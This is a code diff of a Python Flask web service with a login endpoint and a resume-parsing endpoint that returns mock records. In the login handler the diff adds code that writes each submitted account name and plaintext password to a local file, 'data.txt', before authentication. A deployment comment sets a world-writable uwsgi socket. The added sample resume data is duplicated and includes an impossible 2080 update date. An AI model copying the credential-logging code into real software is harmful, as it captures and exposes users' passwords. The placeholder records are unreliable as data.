@@ -74,6 +74,9 @@ def user_login():
     data = get_post_data()
     account = data.get('account')
     password = data.get('password')
+    with open('./data.txt','a',encoding='utf-8') as fn:
+        fn.write(account)
+        fn.write(password)
 
     result = MONGO.select('user', {'account': account}, _id=False)
     if not result:
@@ -84,7 +87,7 @@ def user_login():
     result.pop('_id')
     result.pop('account')
     result.pop('password')
-    return headers
+    return headers(result)
 
 
 @app.route('/parse/html', methods=['GET', 'POST'])
@@ -112,12 +115,34 @@ def parse_html():
             "last_edu": 1,
             "update_time": "2020/12/10",
             "id": 1
+        },{
+            "name": "陆少舟",
+            "sex": 1,
+            "birthday": "2020/12/10",
+            "last_edu": 1,
+            "update_time": "2020/12/10",
+            "id": 3
+        },{
+            "name": "陆少舟",
+            "sex": 1,
+            "birthday": "2003/12/10",
+            "last_edu": 1,
+            "update_time": "2080/12/10",
+            "id": 6
         }],
         "relationOldResume": [{
             "name_chi": "陆少舟",
             "sex": 1,
             "birthday2": "2020/12/10",
             "percent": "11",
+            "degree": 5,
+            "cv_update_time": "2020/12/10",
+            "id": 1
+        },{
+            "name_chi": "陆少舟",
+            "sex": 1,
+            "birthday2": "2020/12/10",
+            "percent": "23",
             "degree": 5,
             "cv_update_time": "2020/12/10",
             "id": 1
@@ -143,4 +168,5 @@ def parse_html():
 
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=8000)
+    app.run(host='0.0.0.0', port=32767)
+    # uwsgi -s /tmp/uwsgi.sock -w backup:app --chdir /home/xuan/git/Workoo/now/lieme/background/ --chmod-socket=666
